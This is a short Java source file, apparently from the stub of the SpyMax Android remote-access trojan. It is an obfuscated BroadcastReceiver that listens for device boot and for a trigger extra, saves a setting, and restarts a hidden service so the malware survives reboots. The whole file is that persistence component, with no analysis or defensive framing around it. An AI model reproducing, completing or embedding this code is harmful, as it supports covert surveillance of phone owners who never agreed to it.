package spymax.stub7;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class ClassGen1 extends BroadcastReceiver {
    @Override
    public void onReceive(Context x, Intent e) {
        if (e != null){
            String j = x.getResources().getString(R.string.n1n2n3n4n5n6);
            if(e.hasExtra(j)){
                ClassGen3.dit(x,ClassGen3.jx,j);
                rn(x);
            }
             try{
                 if (e.getAction().equalsIgnoreCase(Intent.ACTION_BOOT_COMPLETED)){
                     if (ClassGen3.gt(x,j).length() != 0){
                         ClassGen3.dit(x,ClassGen3.jx,j);
                     }
                     rn(x);
                 }
             }catch (Exception ex){}
        }
    }
    private void rn(Context x){
        if(ClassGen10.r(ClassGen11.class,x)) {
            Intent i = new Intent(x, ClassGen11.class);
            ClassGen3.sr(x,i);
        }
    }
}